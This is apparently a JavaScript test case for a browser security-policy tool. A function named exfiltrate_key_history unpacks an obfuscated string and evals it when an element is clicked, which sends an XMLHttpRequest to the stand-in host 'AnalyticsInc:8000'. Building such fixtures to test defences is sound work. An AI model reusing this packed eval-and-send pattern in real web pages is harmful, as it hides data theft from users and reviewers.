
JAM.startProfile('load');
function exfiltrate_key_history() {
  function v3(p, a, c, k, e$$4, d) {
    function v2() {
      return"\\w+"
    }
    function v1(e$$5) {
      introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
        return d[e$$5]
      }
    }
    function v0(c$$1) {
      return c$$1.toString(36)
    }
    e$$4 = v0;
    var v14 = "".replace(/^/, String);
    var v7 = !v14;
    if(v7) {
      var v6 = c;
      c = c - 1;
      for(;v6;) {
        var v4 = d;
        var v5 = c.toString(a);
        introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
          var v15 = k[c]
        }
        var v18 = !v15;
        if(v18) {
          v15 = c.toString(a)
        }
        JAM.set(v4, v5, v15);
        v6 = c;
        c = c - 1
      }
      k = [v1];
      e$$4 = v2;
      c = 1
    }
    var v11 = c;
    c = c - 1;
    for(;v11;) {
      introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
        var v10 = k[c]
      }
      if(v10) {
        var v20 = JAM.call(e$$4, null, [c]);
        var v19 = "\\b" + v20;
        var v16 = v19 + "\\b";
        var v8 = new RegExp(v16, "g");
        introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
          var v9 = k[c]
        }
        p = p.replace(v8, v9)
      }
      v11 = c;
      c = c - 1
    }
    return p
  }
  var v17 = "xmlhttp|http|AnalyticsInc|GET|XMLHttpRequest|new|8000|open|submission|true|send|daftlogic|test|html|null".split("|");
  var v12 = v3('0=5 4();0.7("3","1://2:6/8.d?"+"c=b",9);0.a(e);', 15, 15, v17, 0, {});
  if(JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + v12 + " }")
  }else {
    JAM.call(eval, null, [v12])
  }
  return
}
var v13 = document.getElementById("test");
JAM.set(v13, "onclick", exfiltrate_key_history);

JAM.stopProfile('load');
